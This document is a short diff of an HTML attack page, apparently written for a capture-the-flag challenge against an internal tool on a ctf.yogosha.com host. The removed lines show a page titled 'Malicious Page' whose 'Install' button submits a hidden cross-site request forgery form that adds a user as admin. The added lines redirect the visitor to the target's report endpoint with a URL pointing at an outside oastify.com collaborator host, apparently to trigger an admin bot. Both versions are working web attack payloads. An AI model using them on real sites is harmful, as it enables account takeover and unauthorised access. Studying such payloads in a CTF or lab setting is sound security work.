@@ -1,18 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Malicious Page</title>
+    <title>Redirect</title>
 </head>
 <body>
-    <h1>Malicious Page</h1>
-    <button id="installbutton">Install</button>
-    <form id="csrfForm" method="POST" action="https://internaltool.ctf.yogosha.com/api/teams/1/addUser/admin" style="display: none;">
-        <input type="hidden" name="csrfToken" value="your_csrf_token">
-    </form>
     <script>
-        document.getElementById('installbutton').addEventListener('click', function() {
-            document.getElementById('csrfForm').submit();
-        });
+        window.location.href = 'https://internaltool.ctf.yogosha.com/report?report=http://kc0zc4myyhm2adfqb23davzttkzbnabz.oastify.com';
     </script>
 </body>
 </html>
